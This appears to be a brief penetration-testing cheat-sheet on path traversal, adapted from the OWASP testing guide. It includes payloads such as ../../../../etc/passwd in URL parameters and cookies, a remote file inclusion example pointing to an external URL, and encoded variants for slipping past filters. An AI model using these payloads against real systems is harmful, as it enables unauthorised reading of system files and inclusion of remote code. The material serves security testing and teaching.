# Path Traversal

## Step 1 Identify parameters

Identify:

* any request parameters that could be used for file-related operations

`http://example.com/getUserProfile.jsp?item=ikki.html`

* any unusual file extensions

`http://example.com/main.cgi?home=index.htm`

* any interesting variable names

`http://example.com/index.php?file=content`

* cookie used by web application for the dynamic generation of pages 

`Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`

## Step 2 Insert malicious string

For example, for Linux/UNIX, we can insert `../../../../etc/passwd`

`http://example.com/getUserProfile.jsp?item=../../../../etc/passwd`

Cookie example: `Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd`

Includes files and scripts from external website \(remote file inclusion\):

`http://example.com/index.php?file=http://www.owasp.org/malicioustxt`

To show the source code of a CGI component `http://example.com/main.cgi?home=main.cgi`

## Encoding

URL encode \(once\) Linux

> %2e%2e%2f = ../ %2e%2e/ = ../ ..%2f = ../

Windows:

> %2e%2e%5c = .. %2e%2e = .. ..%5c = ..\

URL encode \(double\) Windows

> %252e%252e%255c = .. ..%255c = ..\

Unicode/UTF-8 Encoding

> ..%c0%af = ../ ..%c1%9c = ..\

## OS/application consideration

Different OS/APIs have different behavior in the parsing of file paths

Source: [https://www.owasp.org/index.php/Testing\_Directory\_traversal/file\_include\_\(OTG-AUTHZ-001\)](https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_%28OTG-AUTHZ-001%29)

